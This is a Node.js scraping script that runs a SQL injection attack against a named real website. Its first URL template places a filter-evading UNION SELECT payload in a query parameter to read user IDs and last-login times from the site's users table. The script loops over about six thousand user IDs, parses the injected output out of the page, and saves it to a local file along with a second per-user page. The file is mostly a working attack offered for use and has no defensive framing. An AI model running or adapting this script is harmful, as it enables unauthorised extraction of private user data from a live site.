const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');
const path = require('path');

const urlTemplate1 = "https://golperjhuri.com/writer.php?wr=4+AND+0+/*!12345UNION*/+SELECT+(SELECT+GROUP_CONCAT(user_id,0x203a3a20,user_last_login+SEPARATOR+0x3c62723e)+FROM+users+WHERE+user_id=%d)--+-/*";
const urlTemplate2 = "https://golperjhuri.com/gj.php?uid=%d";

const outputFilePath = path.join(__dirname, 'h3_tags_output.txt');
const logFilePath = path.join(__dirname, 'scrape_log.txt');

const scrapeData = async () => {
    const output = fs.createWriteStream(outputFilePath, { flags: 'a', encoding: 'utf-8' });
    const log = fs.createWriteStream(logFilePath, { flags: 'a', encoding: 'utf-8' });

    for (let userId = 1; userId <= 6091; userId++) {
        const url1 = urlTemplate1.replace('%d', userId);
        const url2 = urlTemplate2.replace('%d', userId);

        try {
            const [response1, response2] = await Promise.all([axios.get(url1), axios.get(url2)]);

            if (response1.status === 200 && response2.status === 200) {
                const $ = cheerio.load(response1.data);
                const h3Tags = $('h3');
                let thirdH3 = '';

                if (h3Tags.length > 2) {
                    thirdH3 = $(h3Tags[2]).text().trim().replace('এর গল্প সমূহঃ -', '').trim();
                } else {
                    log.write(`User ID ${userId}: Less than 3 H3 tags found.\n`);
                }

                const pageContent = response2.data.trim();
                output.write(`User ID ${userId}\n${thirdH3}\n${pageContent}\n`);
                log.write(`User ID ${userId}: Successfully processed.\n`);
            } else {
                log.write(`User ID ${userId}: Failed to retrieve pages. Status codes: ${response1.status}, ${response2.status}\n`);
            }
        } catch (error) {
            log.write(`User ID ${userId}: Error occurred: ${error.message}\n`);
        }
    }

    output.end();
    log.end();
};

scrapeData().catch(error => {
    console.error('An error occurred during scraping:', error);
});
